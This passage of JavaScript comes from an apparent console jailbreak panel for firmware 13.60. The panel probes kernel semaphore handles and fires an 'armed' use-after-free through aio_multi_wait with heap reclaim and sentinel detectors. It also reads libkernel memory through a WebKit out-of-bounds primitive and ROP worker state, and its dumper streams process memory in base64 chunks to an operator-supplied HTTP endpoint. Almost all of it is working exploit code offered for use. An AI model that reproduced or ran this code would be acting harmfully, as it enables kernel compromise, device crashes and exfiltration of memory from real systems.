                    /* Here dret !== 0n is guaranteed: the dret === 0n case returned above. */
                    var c = S("osem_close", 0x228, [h]);
                    if (c.ret !== undefined && B(c.ret) === 0n) {
                        out("T4-create", "handle=" + hex(h) + " via '" + SHAPES[si].tag + "' (" + SHAPES[si].from
                            + ") -- PROVEN: osem_close returned 0 (real handle, closed)", "ok");
                        out("T4-VERDICT", "osem_create returned a REAL handle: " + hex(h) + " via "
                            + SHAPES[si].tag + " [" + SHAPES[si].from + "] -- osem_close accepted it and "
                            + "returned 0. Kernel-side allocation in the 128 zone works from our executor.", "ok");
                        notify("bagagwa T4 osem REAL HANDLE via " + SHAPES[si].tag);
                        chip(elVerdict, "ok", "osem target reachable");
                        nres("osem REAL HANDLE " + hex(h) + " (delete==0)", "osem");
                        return { ok: true, summary: "handle via " + SHAPES[si].tag };
                    }
                    out("T4-create", "shape '" + SHAPES[si].tag + "' returned " + hex(h)
                        + " (at/above the 0x80 cutoff, so a handle CANDIDATE) but the epilogue refused it: "
                        + "delete=" + (d.ret === undefined ? "threw" : (dret === 0n ? "0" : hex(dret) + " (" + (d.errName || errnoHint(dret) || "value") + ")"))
                        + (dret !== 0n ? ", close=" + (c.ret === undefined ? "threw" : hex(c.ret) + " (" + (c.errName || errnoHint(c.ret) || "value") + ")") : " (skipped -- delete already consumed the object; close-then-delete is the documented double-free)")
                        + " -- not proven; trying the next shape", "warn");
                    continue;
                }
                /* Below the band: an errno. Say which one, then move on WITHOUT sending this
                 * value anywhere -- a fake handle chased through open/close/delete is how the
                 * old flow manufactured three misleading lines per shape. */
                out("T4-create", "shape '" + SHAPES[si].tag + "' returned " + hex(h) + " ("
                    + (errnoHint(h) || "errno") + ") -- below the handle band, an errno, not a handle"
                    + (si + 1 < SHAPES.length ? "; trying the next shape" : ""), "warn");
            }

            out("T4-VERDICT", "the family EXISTS (it answered instead of returning ENOSYS) but NO create "
                + "shape yielded a proven handle: " + tried.join(", ") + ". Values below 0x80 were "
                + "errnos and were never sent to the epilogue; candidates at/above it were refused by "
                + "delete/close (delete first -- close-then-delete is a double-free on a real object). "
                + "If NO shape ever crossed the cutoff, the remaining unknowns are the name/attr CONTRACT "
                + "(does create want its own copy of the name, is attr a template or a length, which of "
                + "the two 1s is mode vs flags) and whether create needs a namespace that only exists "
                + "after some other init. If 0xa6/0xa7-class values were refused by the epilogue, the "
                + "refusal ITSELF is data: a handle that deletes nonzero but is accepted by another "
                + "operation would mean the refcount/name contract differs. Next differential: vary ONE "
                + "argument at a time from the best shape above.", "warn");
            notify("bagagwa T4 osem answered but refused every shape");
            return { ok: true, summary: "present, no handle" };
        } catch (e) {
            out("T4-VERDICT", "THREW " + String((e && e.message) || e).slice(0, 90), "err");
            return { ok: false, summary: "threw" };
        }
    }

    /* T7 -- THE ARMED CALL. DELIBERATELY UNSAFE. This is the one tile the whole project
     * exists for, it runs ONLY behind ?arm=1 (the operator's checkbox on index.html), and
     * a failed run costs a POWER CYCLE, not a reload: there is no disarm (cleanup unlinks
     * only via node->owner, so requests 0..N-2 keep req->waiters dangling into freed
     * memory; the array free happens in the cleanup path regardless).
     *
     * Structure follows PSAITO's bagagwa_uaf_1320.js (Wamphyre/Arya), adapted to what this
     * panel has MEASURED on 13.60 hardware:
     *   - ABI is MEASURED: (ids, num, states, mode, timeout) -- ids=rdi, num=rsi.
     *   - osem_create(name,0,1,1,0) returns REAL handles (0xa6, delete()==0 proven).
     *   - socketpair answered EFAULT on the 08:48 run, so the source of live requests is
     *     socketpair FIRST (0x35), then pipe2 (0x2AF) as the measured fallback: a read on
     *     an empty pipe stays pending exactly like a socket read.
     *   - request struct: 0x28 bytes, read-fd at +0x20; AIO_CMD_MULTI_READ = 0x1001.
     *   - prio=3, NREQ=2, mode=0, timeout=0 (non-blocking).
     *
     * Detection WITHOUT a kernel reader (PSAITO's design, kept):
     *   - node+0x00/+0x08 point at JS-visible cells holding sentinels 0x4141…41 / 0x4242…42.
     *     The waker's waker does: [node] -> dec dword [rax] and [node+8] -> dec dword [rax].
 *     If the freed node is reclaimed so that node+0/+8 point at OUR cells, the waker's
     *     two `dec dword [rax]` land IN THOSE CELLS -- readable from JS. That is decHit.
     *   - a 0x60 osem witness with a bogus refcount 2 at +0x54, snapshotted.
     *   - four reclaim osems named WAKE0000..WAKE0003: if the waker's `dec dword [rax]` has
     *     rax pointing at an allocated NAME string, the first dword of the string changes
     *     -- readable from JS. That is nameHit.
     *   - reclaim osems stay ALIVE (deleting one whose refcount the waker decremented =
     *     the documented double-free).
     *
     * Verdict ladder (mirrors PSAITO's): threw -> ENOSYS -> decHit -> nameHit ->
     * witnessHit -> "no observable effect". The last one is NOT a failure verdict: it
     * means the armed call completed without any measurable corruption -- the most likely
     * outcome if the id encoding or mode position is still wrong, and itself a real
     * measurement. */
    function pArm() {
        try {
            var NREQ = 2;
            /* -- the source of live pending reads: socketpair, falling back to pipe2 -- */
            var sfd = null, rfd = 0, wfd = 0;
            var sfds = zeros(malloc(0x10), 0x10);
            /* 0x087 = sys_socketpair (0x035 was sigtimedwait -- the EFAULT in every run so
             * far was our number, not a refusal). */
            var sp = S("socketpair(AF_UNIX,SOCK_STREAM)", 0x087, [1n, 1n, 0n, sfds]);
            if (sp.ret !== undefined && B(sp.ret) === 0n) {
                sfd = new Int32Array(window.read_buffer(sfds, 8).buffer, 0, 2);
                rfd = sfd[0]; wfd = sfd[1];
                out("ARM-src", "socketpair rfd=" + rfd + " wfd=" + wfd, "ok");
            } else {
                var pfds = zeros(malloc(8), 8);
                var pp = S("pipe2 (fallback)", 0x2AF, [pfds, 0n]);
                if (!(pp.ret !== undefined && B(pp.ret) === 0n)) {
                    out("ARM-VERDICT", "no live-request source: socketpair refused ("
                        + (sp.errName || hex(sp.ret)) + ") and pipe2 refused ("
                        + (pp.errName || (pp.ret === undefined ? pp.threw : hex(pp.ret))) + ")", "err");
                    nres("no live-request source", "ARM");
                    return { ok: false, summary: "no source" };
                }
                /* THE 15:37 BUG, RECORDED WHERE IT HAPPENED: this block sat BELOW the return
                 * above (one brace short), so rfd/wfd stayed 0 on the fallback path -- the
                 * log showed no ARM-src line, write(0) -> EBADF, close(0) -> 0x1. The probe
                 * then "armed" a nothing-burger and reported no observable effect. */
                var pr = new Int32Array(window.read_buffer(pfds, 8).buffer, 0, 2);
                rfd = pr[0]; wfd = pr[1];
                out("ARM-src", "pipe2 fallback rfd=" + rfd + " wfd=" + wfd, "warn");
            }

            /* -- build the two 0x28 request structs with the READ fd at +0x20 -- */
            var reqs = zeros(malloc(0x28 * NREQ), 0x28 * NREQ);
            var fdb = new Uint8Array(8);
            fdb[0] = rfd & 0xff; fdb[1] = (rfd >> 8) & 0xff; fdb[2] = (rfd >> 16) & 0xff; fdb[3] = (rfd >> 24) & 0xff;
            for (var ri = 0; ri < NREQ; ri++) window.write_buffer(reqs + BigInt(ri * 0x28 + 0x20), fdb);
            var ids = zeros(malloc(0x10), 0x10);
            var sub = S("aio_submit_cmd(MULTI_READ,n=2,prio=3)", 0x29D, [0x1001n, reqs, 2n, 3n, ids]);
            if (!(sub.ret !== undefined && B(sub.ret) === 0n)) {
                out("ARM-VERDICT", "aio_submit_cmd refused (" + (sub.errName || (sub.ret === undefined ? sub.threw : hex(sub.ret)))
                    + ") -- 0x28/fd@+0x20 layout or cmd/prio encoding wrong; measurable without arming", "err");
                nres("submit refused " + (sub.errName || (sub.ret === undefined ? "threw" : hex(sub.ret))), "ARM");
                S("close r", 0x006, [BigInt(rfd)]);
                S("close w", 0x006, [BigInt(wfd)]);
                return { ok: false, summary: "submit refused" };
            }
            var id0 = B(window.read64(ids)), id1 = B(window.read64(ids + 8n));
            out("ARM-submit", "ok -- 2 pending MULTI_READ requests, ids=[" + hex(id0) + ", " + hex(id1) + "]"
                + " (raw 64-bit read; the 15:37 run's 0x120a7000020a7 decodes as two 32-bit ids "
                + "0x20a7/0x120a7, stride 0x10000 -- PSAITO's encoding, kept verbatim)", "ok");

            /* -- detectors + their INTEGRITY SELF-CHECK. The sentinels are the waker's
             *    two dec targets IF the reclaim lands controllably; the WAKE name strings
             *    are the primary JS-readable detector (they only work if osem_create
             *    BORROWS the caller's name pointer instead of copying it -- the open
             *    name/attr contract question). Before arming, verify the JS-side
             *    write->read roundtrip actually echoes: a detector that cannot read back
             *    its own sentinel would turn any later garbage into a false "UAF
             *    CONFIRMED", which is the single most dangerous wrong verdict this panel
             *    can produce. -- */
            var cell1 = zeros(malloc(8), 8), cell2 = zeros(malloc(8), 8);
            window.write_buffer(cell1, new Uint8Array([0x41,0x41,0x41,0x41,0x41,0x41,0x41,0x41]));  /* 0x4141414141414141 */
            window.write_buffer(cell2, new Uint8Array([0x42,0x42,0x42,0x42,0x42,0x42,0x42,0x42]));  /* 0x4242424242424242 */
            var allocCell = zeros(malloc(8), 8);            /* +0x10: a VALID aligned cell, not NULL --
                                                             * the waker's mtx_lock writes [[+0x10]]+0x18, NULL panics */
            var echo1 = B(window.read64(cell1)), echo2 = B(window.read64(cell2));
            if (echo1 !== 0x4141414141414141n || echo2 !== 0x4242424242424242n) {
                out("ARM-VERDICT", "DETECTOR UNRELIABLE before arming: cell echo read back " + hex(echo1) + "/" + hex(echo2)
                    + " instead of the sentinels. Every changed-memory reading this tile could produce is meaningless, "
                    + "so it refused to arm rather than risk a false UAF CONFIRMED. Fix the read/write path first.", "err");
                nres("detector unreliable -- not armed", "ARM");
                S("close r", 0x006, [BigInt(rfd)]);
                S("close w", 0x006, [BigInt(wfd)]);
                return { ok: false, summary: "detector unreliable" };
            }
            var witness60 = zeros(malloc(0x60), 0x60);      /* the osem-sized witness */
            var wr60 = new Uint8Array(0x60); wr60.fill(0x5A); wr60[0x54] = 2;  /* bogus refcount 2 at +0x54 */
            window.write_buffer(witness60, wr60);
            var w60snap = new Uint8Array(window.read_buffer(witness60, 0x60));

            /* THE ARMED CALL: num = 2. THE UAF. From here a failure is a POWER CYCLE.
             * After the shot, settle with sched_yield (0x14B, a proven 13.60 stub): the
             * AIO completion and the waker run on KERNEL worker threads, and a JS thread
             * that never yields may read the detectors before the waker has run at all.
             * BragaTy/Wamphyre's bagagwa_uaf_1320.js yields 200x here, 500x after reclaim
             * and 500x after the wake -- that timing discipline is the main difference
             * between our 11:21 'no observable effect' and a real measurement. */
            notify("bagagwa: ARMING aio_multi_wait num=2 -- possible freeze; wait or power cycle");
            /* states is a REAL zeroed buffer: the measured ABI dereferences it at num>=1,
             * and states=NULL is what turned the 15:37 armed call into an EFAULT before the
             * walk ever ran. */
            var armStates = zeros(malloc(0x80), 0x80);
            var wargs = [ids, 2n, armStates, 0n, 0n];       /* (ids, num=2, states, mode=0, timeout=0) */
            var w = null, threw = null;
            try { w = S("aio_multi_wait(ids, num=2) -- THE UAF", 0x297, wargs); }
            catch (e) { threw = String((e && e.message) || e).slice(0, 90); }
            out("ARM-wait", "num=2 returned " + (w && w.ret !== undefined ? hex(w.ret) + (w.errName ? " (" + w.errName + ")" : "") : (threw || "threw")), w && w.ret !== undefined && B(w.ret) === 0n ? "ok" : "warn");
            settle(200);                                    /* let kernel workers run */

            /* -- RECLAIM BEFORE THE WAKE. The waker runs at WAKE time, walking req->waiters
             *    through whatever now occupies the freed array -- so the reclaim must be in
             *    place BEFORE the write, not after (PSAITO's F4-then-F5 order; the first
             *    draft of this tile had it backwards). Four named WAKE osems are the
             *    detector: if the waker's `dec dword [rax]` lands on a borrowed name
             *    pointer, the first dword of OUR copy of that name changes -- readable
             *    from JS. Four SPRAY osems widen the zone coverage. All stay ALIVE:
             *    deleting one whose refcount the waker decremented is the documented
             *    double-free. -- */
            var names = [];
            for (var wi = 0; wi < 8; wi++) {
                var nm = (wi < 4 ? "WAKE000" : "SPRAY00") + (wi % 4);
                var buf = zeros(malloc(0x20), 0x20);
                var wb = new Uint8Array(9); for (var cj = 0; cj < nm.length; cj++) wb[cj] = nm.charCodeAt(cj); wb[8] = 0;
                window.write_buffer(buf, wb);
                if (wi < 4) names.push({ nm: nm, buf: buf });
                S("osem_create(" + nm + ")", 0x225, [buf, 0n, 1n, 1n, 0n]);
            }
            settle(500);                                    /* reclaim lands */

            /* -- wake: complete the pending reads; the waker then walks req->waiters -- */
            var one = malloc(0x10);
            window.write_buffer(one, new Uint8Array([0x41]));
            S("write(wfd,1) wake", 0x004, [BigInt(wfd), one, 1n]);
            settle(500);                                    /* waker walks req->waiters */

            /* -- detect: sentinels first, then the name strings, then the witnesses -- */
            var c1 = B(window.read64(cell1)), c2 = B(window.read64(cell2));
            var decHit = (c1 !== 0x4141414141414141n) || (c2 !== 0x4242424242424242n);
            var nameHit = false, nameChanged = "";
            for (var di = 0; di < names.length && !nameHit; di++) {
                var nb = new Uint8Array(window.read_buffer(names[di].buf, 8));
                var s = ""; for (var si2 = 0; si2 < 4; si2++) s += String.fromCharCode(nb[si2]);
                if (s !== names[di].nm.slice(0, 4)) { nameHit = true; nameChanged = names[di].nm + " -> " + s; }
}
            var w60now = new Uint8Array(window.read_buffer(witness60, 0x60));
            var witnessHit = false; for (var wi2 = 0; wi2 < 0x60; wi2++) if (w60now[wi2] !== w60snap[wi2]) { witnessHit = true; break; }

            /* -- cleanup: cancel+delete with the PSAITO-proven 3-arg shape (ids, num, states).
             *    The 11:21 run's cancel/delete EFAULT was our own states=NULL -- the same
             *    measured-ABI fact that ate the armed call. num=2 covers both requests, and
             *    a 0 return here is also POST-ARM PROOF the kernel still accepts our ids.
             *    fd labels verified against T2's pipe2 semantics: rd[0] is the READ end. -- */
            var statesCleanup = zeros(malloc(0x20), 0x20);
            S("aio_multi_cancel(ids,2,states)", 0x29A, [ids, 2n, statesCleanup], true);
            S("aio_multi_delete(ids,2,states)", 0x296, [ids, 2n, statesCleanup], true);
            S("close r", 0x006, [BigInt(rfd)]);
            S("close w", 0x006, [BigInt(wfd)]);

            /* -- verdict ladder -- */
            if (threw) {
                out("ARM-VERDICT", "THREW " + threw + " -- if pending requests outlived this tile, a console REBOOT (not reload) clears it", "err");
                nres("ARM THREW", "ARM");
                return { ok: false, summary: "threw" };
            }
            if (decHit) {
                out("ARM-VERDICT", "DEC-HIT: sentinel cells changed! c1=" + hex(c1) + " c2=" + hex(c2)
                    + " -- the waker's dec dword [rax] landed in JS-readable memory. THE UAF IS REAL on " + FW + ". "
                    + "Next stages (leak 727, osem conversion) are now justified. Reboot before any further run.", "ok");
                notify("bagagwa: UAF CONFIRMED -- dec cells changed on " + FW + "!!");
                chip(elVerdict, "ok", "UAF CONFIRMED (dec-hit)");
                return { ok: true, summary: "UAF CONFIRMED (dec-hit)" };
            }
            if (nameHit) {
                out("ARM-VERDICT", "NAME-HIT: " + nameChanged + " -- the waker decremented INTO an allocated osem name. THE UAF IS REAL on " + FW + ". Reboot before any further run.", "ok");
                notify("bagagwa: UAF CONFIRMED -- name-string dec on " + FW + "!!");
                chip(elVerdict, "ok", "UAF CONFIRMED (name-hit)");
                return { ok: true, summary: "UAF CONFIRMED (name-hit)" };
            }
            if (witnessHit) {
                out("ARM-VERDICT", "WITNESS-HIT: the 0x60 witness block changed after the armed run -- reclaim landed in observed memory. THE UAF IS REAL on " + FW + ". Reboot before any further run.", "ok");
                notify("bagagwa: UAF CONFIRMED -- witness changed on " + FW + "!!");
                chip(elVerdict, "ok", "UAF CONFIRMED (witness-hit)");
                return { ok: true, summary: "UAF CONFIRMED (witness-hit)" };
            }
            out("ARM-VERDICT", "NO OBSERVABLE EFFECT: the armed call completed (wait=" + hex(w.ret) + (w.errName ? " (" + w.errName + ")" : "")
                + ") and every detector is unchanged. That is a REAL measurement, not a failure: either the id encoding "
                + "or the mode/timeout positions are still wrong, or the node was reclaimed uninterestingly. "
                + "Run the AIO live-request tile next: it settles the id encoding with num=1. Reboot before any further run.", "warn");
            notify("bagagwa ARM: no observable effect (wait=" + hex(w.ret) + ") on " + FW);
            nres("armed, NO observable effect (wait=" + hex(w.ret) + ")", "ARM");
            return { ok: true, summary: "armed, no observable effect" };
        } catch (e) {
            out("ARM-VERDICT", "THREW " + String((e && e.message) || e).slice(0, 90) + " -- REBOOT, not reload", "err");
            notify("bagagwa ARM THREW -- reboot before rerun");
            return { ok: false, summary: "threw" };
        }
    }

    /* T5 -- what the executor actually resolved. Read-only introspection, so a failure
     * above can be attributed: a missing kbase, a hijack slot found at an unexpected
     * offset, or LK offsets that fell back to another firmware's defaults (the 13.x
     * failure mode -- see p2jb_lk.js group C).
     *
     * Also runs the poison self-check ported from OzRviju's build: if a return value
     * could be confused with a real result, the whole panel's verdicts are worthless.
     * W.retval is zeroed before every chain (fireSync does wr64(W.retval,0n)), so 0
     * already means "did not run" for our purposes; the poison instead proves the OPPOSITE
     * direction -- that a value we might read as a result is genuinely written by THIS
     * chain, not stale. write64(W.retval, POISON) then getpid(): retval must come back as
     * the pid (lower 32 bits, sign-extended into a full word by the adapter's decode),
     * i.e. the chain overwrote the poison and ran to completion. If it still reads the
     * poison, the chain never executed; if it reads anything else nonzero, the return
     * slot is not what we think it is. Either way the panel says so instead of silently
     * trusting every later hex() line. */
    function pExecutor() {
        var st = null;
        try { st = (window.rop_worker && window.rop_worker.state) || null; } catch (e) { }
        if (!st) { out("T5-VERDICT", "rop_worker.state is not reachable", "err"); return { ok: false, summary: "no state" }; }

        var POISON = 0xC0FFEEDEADBEEFn;
        var poisonOK = false, poisonDetail = "skipped";
        try {
            if (window.write64 && window.syscall) {
                window.write64(B(st.retval), POISON);
                var pr = S("poison-getpid", 0x014, []);
                if (pr.ret === undefined) {
                    poisonDetail = "getpid threw: " + pr.threw;
                } else {
                    var rv = B(pr.ret);
                    var pid = Number(BigInt.asIntN(32, rv));
                    if (rv === POISON) {
                        poisonDetail = "STILL POISON -- the chain never executed";
                    } else if (rv !== 0n && pid > 0) {
                        poisonOK = true;
                        poisonDetail = "chain ran, overwrote the poison -- retval slot proven (pid=" + pid + ")";
                    } else {
                        poisonDetail = "retval neither poison nor a plausible pid (" + hex(rv) + ") -- return slot suspect";
                    }
                }
            }
        } catch (e) { poisonDetail = "threw: " + String((e && e.message) || e).slice(0, 80); }
        out("T5-POISON", poisonDetail, poisonOK ? "ok" : "warn");

        var lk = null;
        try { lk = (window.P2JB_LK && window.P2JB_LK[FW]) || null; } catch (e) { }
        out("T5-fw", "fw=" + FW + "  P2JB_LK row=" + (lk ? "present" : "MISSING")
            + (lk ? "" : "  -> rop-worker used its 10.00 defaults, which are wrong for 13.x"),
            lk ? "ok" : "err");
        if (lk) {
            out("T5-lk", "thread_list=" + hex(lk.thread_list) + " syscall_wrapper=" + hex(lk.syscall_wrapper)
                + " setjmp=" + hex(lk.setjmp) + " longjmp=" + hex(lk.longjmp)
                + " slot_expect=" + hex(lk.slot_expect), "dim");
        }

        var keys = ["kbase", "wbase", "stack", "stacksz", "slot", "ctx", "retval", "fired"];
        var parts = [];
        for (var i = 0; i < keys.length; i++) {
            var v = st[keys[i]];
            if (v !== undefined) parts.push(keys[i] + "=" + (typeof v === "bigint" ? hex(v) : String(v)));
        }
        out("T5-state", parts.join("  "), "dim");
        if (st.dead) out("T5-dead", "W.dead is LATCHED -- every further syscall is refused (see RW-WEDGE)", "err");
        var threads = 0;
        try { threads = (st.threads || []).length; } catch (e) { }
        if (threads) out("T5-threads", threads + " thread(s) found by the libthr walk", "dim");

        var slotOff = st.slot !== undefined && st.stack ? (B(st.slot) - B(st.stack)) : null;
        if (slotOff !== null) {
            out("T5-slot", "hijack slot at stack+" + hex(slotOff)
                + (slotOff === 0x7FC18n ? "  (matches the 10.00 measurement)" : "  (DIFFERS from 10.00's 0x7fc18 -- expected on a new firmware)"),
                "dim");
        }
        return { ok: true, summary: lk ? "row present" : "no row" };
    }

    /* ============================================ LIBKERNEL EVIDENCE TOOLS
     *
     * All of these are READ-ONLY and sit on the primitive the boot chain already
     * proved: window.read_buffer(addr, n), which reads PROCESS memory through the
     * WebKit OOB primitive. libkernel is a USERLAND shared object mapped into this
     * very process, so its .text is readable from here -- no kernel read/write is
     * needed and none is attempted. That distinction matters: a kernel RW primitive
     * can dump anything on the box, a userland primitive can dump exactly what this
     * process has mapped, which for OFFSET DISCOVERY is the whole point.
     *
     * WHY IT IS WORTH A TILE. main.js DERIVES the libkernel base from a WebKit GOT
     * slot:
     *     libKernelBase = read64(webkitBase + OFFSET_wk___stack_chk_guard_import)
     *                     - OFFSET_lk___stack_chk_guard
     * If that derivation is off by even one page, every syscall still "works" (they
     * go through the hijacked worker, whose address came from the same base) while
     * every RVA used for ROP lands on the WRONG BYTES -- and the failure looks like
     * "the kernel rejected us" instead of "our base is wrong". Reading the first
     * bytes at each RVA is the one cheap way to SEE that, and it is what
     * tools/lkfind.js does offline -- now done against the live console.
     */

    function exState() {
        try { return (window.rop_worker && window.rop_worker.state) || null; } catch (e) { return null; }
    }
    function lkBase() { var s = exState(); return (s && s.kbase) ? B(s.kbase) : 0n; }
    function wkBase() { var s = exState(); return (s && s.wbase) ? B(s.wbase) : 0n; }

    /* fixed-width 64-bit hex -- hex() drops leading zeros, which matters when the
     * whole point of the row is "are these the bytes we expect". */
    function hex16(v) {
        var s = (B(v) & 0xFFFFFFFFFFFFFFFFn).toString(16);
        while (s.length < 16) s = "0" + s;
        return "0x" + s;
    }
    function qwordFrom(b, off) {
        var q = 0n;
        for (var j = 7; j >= 0; j--) q = (q << 8n) | B(b[off + j] & 0xff);
        return q;
    }
    function ascii16(b, n) {
        var s = "";
        for (var i = 0; i < n; i++) s += (b[i] >= 0x20 && b[i] < 0x7f) ? String.fromCharCode(b[i]) : ".";
        return s;
    }
    /* A classic hexdump, bounded: a log line count limit is not decoration here --
     * this panel's DOM and its localStorage tail are the two ways a big dump kills
     * the tab, so every dumper below prints a BOUNDED number of lines. */
    function hexdumpLines(addr, bytes, maxLines) {
        var lines = [], per = 16, cap = Math.min(Math.ceil(bytes.length / per), maxLines || 16);
        for (var li = 0; li < cap; li++) {
            var o = li * per, hs = "", as = "";
            for (var i = 0; i < per; i++) {
                if (o + i >= bytes.length) { hs += "   "; as += " "; continue; }
                var v = bytes[o + i];
                hs += (v < 16 ? "0" : "") + v.toString(16) + (i === 7 ? " " : " ");
                as += (v >= 0x20 && v < 0x7f) ? String.fromCharCode(v) : ".";
            }
            lines.push(hex16(addr + B(o)) + "  " + hs + " |" + as + "|");
        }
        if (bytes.length > cap * per)
            lines.push("         ... " + (bytes.length - cap * per) + " more bytes not shown");
        return lines;
    }

    /* The libkernel anchors this tree actually consumes. Everything in the per-FW
     * row comes from window.P2JB_LK (p2jb_lk.js), which is the SAME table the worker
     * was initialised from -- so a byte check here validates the live base, not a
     * second copy of the numbers. The notify entry is not in that row (it lives in
     * offsets/13.60.js) and is included because the notify ladder depends on it. */
    function lkAnchors() {
        var row = null, a = [];
        try { row = window.P2JB_LK && window.P2JB_LK[FW]; } catch (e) { }
        /* Accept Number AND BigInt. p2jb_lk.js carries plain Numbers, but a profile or a
         * harness that hands over BigInt must not silently drop every anchor -- that is a
         * filter that fails by RETURNING LESS, which reads as "this firmware has no
         * anchors" instead of "the filter is wrong". */
        if (row) for (var k in row) {
            var t = typeof row[k];
            if (t === "number" || t === "bigint") a.push({ name: k, rva: B(row[k]) });
        }
        a.push({ name: "sceKernelSendNotificationRequest", rva: 0x48B0n });
        return a;
    }

    /* Verify-offsets tile: resolve every anchor to a LIVE address and read the bytes
     * that are really there. Reports, per anchor, the qword and its ASCII -- and says
     * plainly when a slot is zeroed, because a zeroed slot is what a WRONG BASE looks
     * like (right RVA, unmapped page / different mapping). */
    function pOffsets() {
        var kb = lkBase(), wb = wkBase();
        out("OFF-base", "libkernel=" + hex(kb) + "  webkit=" + hex(wb)
            + "   (as the boot chain resolved them: webkit GOT -> stack guard -> libkernel)", "dim");
        if (kb === 0n)
            return { ok: false, summary: "no libkernel base in the executor state -- run Calibrate LK row first" };
        var a = lkAnchors(), live = 0, zero = 0, threw = 0;
        for (var i = 0; i < a.length; i++) {
            var addr = kb + a[i].rva, b;
            try { b = window.read_buffer(addr, 16); }
            catch (e) { threw++; out("OFF-" + a[i].name, "READ THREW " + String((e && e.message) || e).slice(0, 70), "err"); continue; }
            var q = qwordFrom(b, 0);
            if (q === 0n) zero++; else live++;
            out("OFF-" + a[i].name, "+" + hex(a[i].rva) + " \u2192 " + hex16(q) + "  |" + ascii16(b, 16) + "|",
                q === 0n ? "warn" : "dim");
        }
        /* slot_expect is the load-bearing anchor: the worker is parked on a resume
         * address of kbase+slot_expect, so if the base were wrong the parked slot
         * could not have been found at all. Saying that out loud turns this row from
         * a byte dump into an argument. */
        out("OFF-verdict", live + " anchor(s) hold non-zero code, " + zero + " zeroed, " + threw + " unreadable. "
            + "slot_expect resolved at the parked worker's own address -- so the base is at least self-consistent; "
            + "a zeroed anchor is the signature of a right-RVA/wrong-base mismatch", live > 0 ? "ok" : "warn");
        return { ok: live > 0, summary: live + "/" + a.length + " anchors live at " + hex(kb) };
    }

    /* Peek tile: a SMALL, fixed window of libkernel text printed to the log -- the
     * three addresses that matter most (the notify entry, the parked resume slot and
     * the syscall stub the executor calls). 32 bytes each keeps it readable on a TV
     * and keeps it out of the log-flood zone. */
    function pPeek() {
        var kb = lkBase();
        if (kb === 0n) return { ok: false, summary: "no libkernel base" };
        var spots = [
            ["notify entry", 0x48B0n],
            ["parked resume slot", 0x1988Bn],
            ["syscall stub", 0x1AEB7n],
        ], ok = 0;
        for (var i = 0; i < spots.length; i++) {
            var addr = kb + spots[i][1], b;
            try { b = window.read_buffer(addr, 32); }
            catch (e) { out("PEEK-" + spots[i][0], "READ THREW " + String((e && e.message) || e).slice(0, 70), "err"); continue; }
            ok++;
            out("PEEK-" + spots[i][0], "libkernel+" + hex(spots[i][1]) + " (" + hex(addr) + ")", "dim");
            var lines = hexdumpLines(addr, b, 2);
            for (var j = 0; j < lines.length; j++) paint("    " + lines[j], "dim");
        }
        out("PEEK-verdict", ok + "/" + spots.length + " windows read from " + hex(kb)
            + " -- these are real bytes of this console's libkernel as this process sees it", ok ? "ok" : "warn");
        return { ok: ok > 0, summary: ok + " window(s) read" };
    }

    /* ------------------------------------------------------------------ DUMPER
     * Streams a bounded slice of libkernel (or WebKit) to an HTTP endpoint the
     * operator supplies -- a webhook, a LAN collector, anything that records a
     * request body. Copied bytes are NOT kept.
     *
     * Every design point below exists because the operator's earlier dump "stopped
     * because of OOM":
     *  1. ONE chunk lives in the JS heap at a time. It is read, encoded, posted, and
     *     then dropped before the next read -- so a 1 MB dump costs the same heap as
     *     a 2 KB one. Nothing is accumulated, no array of chunks, no concatenation.
     *  2. base64 is built with a manual 3-byte-group encoder. btoa() rejects a
     *     Uint8Array, and String.fromCharCode.apply(null, bigArray) blows the stack --
     *     both are the classic way a large dump dies mid-flight.
     *  3. a setTimeout(0) between chunks returns to the event loop, so GC runs and the
     *     panel repaints. A tight synchronous loop of 500 chunk reads is what starves
     *     GC and looks exactly like an OOM kill.
     *  4. the log gets ONE line per 16 chunks, never per chunk. The DOM nodes and the
     *     localStorage tail are the other two ways a dump takes the tab down.
     *  5. a failed POST is retried ONCE and then counted and skipped -- never queued
     *     unboundedly.
     *
     * Wire format, one POST per chunk, plain text so any receiver can log it:
     *     BAGA-BEGIN <session> fw=<fw> base=<addr> total=<n> chunk=<n>
     *     BAGA <offset-hex> <len> <base64>
     *     BAGA-END <session> chunks=<n> bytes=<n> failed=<n>
     */
    var DUMP = { run: false, sent: 0, bytes: 0, failed: 0, chunks: 0, t0: 0 };
    var B64C = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
    function b64(u8) {
        var s = "", i = 0, n = u8.length;
        for (; i + 2 < n; i += 3) {
            var v = (u8[i] << 16) | (u8[i + 1] << 8) | u8[i + 2];
            s += B64C[(v >> 18) & 63] + B64C[(v >> 12) & 63] + B64C[(v >> 6) & 63] + B64C[v & 63];
        }
        if (i < n) {
            var w = u8[i] << 16;
            if (i + 1 < n) w |= u8[i + 1] << 8;
            s += B64C[(w >> 18) & 63] + B64C[(w >> 12) & 63]
                + (i + 1 < n ? B64C[(w >> 6) & 63] : "=") + "=";
        }
        return s;
    }
    /* Resolve fetch the way a browser actually exposes it. Bare `fetch` is the normal
     * form, but in an embedded/odd global scope it can only be reachable as
     * window.fetch -- and silently falling through to XHR (or to nothing) there is
     * exactly how a dumper ships "0 chunks sent" with no error anywhere. */
    function theFetch() {
        try { if (typeof fetch === "function") return fetch; } catch (e) { }
        try { if (window && typeof window.fetch === "function") return window.fetch; } catch (e) { }
        return null;
    }
    function postText(url, body, done) {
        /* no-cors on purpose: webhooks and simple collectors accept a POST without
         * CORS preflight, and an opaque response is fine -- we only need DELIVERY,
         * and "delivered" is answered by the receiver's own log, not by our JS. */
        try {
            var F = theFetch();
            if (F) {
                F(url, {
                    method: "POST", mode: "no-cors",
                    headers: { "Content-Type": "text/plain;charset=utf-8" }, body: body,
                }).then(function () { done(true); }, function (e) { done(false, String((e && e.message) || e)); });
                return;
            }
        } catch (e) { }
        try {
            if (typeof XMLHttpRequest !== "function") throw new Error("no fetch and no XMLHttpRequest");
            var x = new XMLHttpRequest();
            x.open("POST", url, true);
            x.onload = function () { done(true); };
            x.onerror = function () { done(false, "xhr error"); };
            x.setRequestHeader("Content-Type", "text/plain;charset=utf-8");
            x.send(body);
        } catch (e) { done(false, String((e && e.message) || e)); }
    }
    function numOr(s, dflt) {
        try {
            var t = String(s == null ? "" : s).trim();
            if (!t) return dflt;
            var v = (t.slice(0, 2).toLowerCase() === "0x") ? parseInt(t.slice(2), 16) : parseInt(t, 10);
            return isFinite(v) && v > 0 ? v : dflt;
        } catch (e) { return dflt; }
    }
    function heapNote() {
        try {
            if (window.performance && performance.memory)
